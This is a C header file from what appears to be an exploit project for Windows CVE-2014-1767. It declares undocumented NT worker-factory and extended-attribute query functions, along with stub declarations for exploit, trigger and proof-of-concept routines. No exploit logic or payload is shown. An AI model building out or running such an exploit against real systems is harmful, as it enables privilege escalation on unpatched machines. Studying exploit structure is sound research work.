#pragma once
#include "base.h"
#pragma comment(lib, "WS2_32.lib")

#define INPUT_SIZE 100

typedef NTSTATUS(NTAPI *lpfnNtCreateWorkerFactory)(PHANDLE WorkerFactoryHandleReturn,
												   ACCESS_MASK DesiredAccess,
												   POBJECT_ATTRIBUTES ObjectAttributes,
												   HANDLE CompletionPortHandle,
												   HANDLE WorkerProcessHandle,
												   PVOID StartRoutine,
												   PVOID StartParameter,
												   ULONG MaxThreadCount,
												   SIZE_T StackReserve,
												   SIZE_T StackCommit);

typedef NTSTATUS(NTAPI *lpfnNtSetInformationWorkerFactory)(HANDLE WorkerFactoryHandle,
														   LONG WorkerFactoryInformationClass,
														   PVOID WorkerFactoryInformation,
														   ULONG WorkerFactoryInformationLength);
typedef NTSTATUS(NTAPI *lpfnNtQueryEaFile)(HANDLE FileHandle,
										   PIO_STATUS_BLOCK IoStatusBlock,
										   PVOID Buffer,
										   ULONG Length,
										   BOOLEAN ReturnSingleEntry,
										   PVOID EaList,
										   ULONG EaListLength,
										   PULONG EaIndex OPTIONAL,
										   BOOLEAN RestartScan);


BOOL Exploit_CVE_2014_1767();
BOOL Init_CVE_2014_1767();
SOCKET GetSocket();
BOOL Trigger_CVE_2014_1767(HANDLE hDevice);
void POC_CVE_2014_1767();
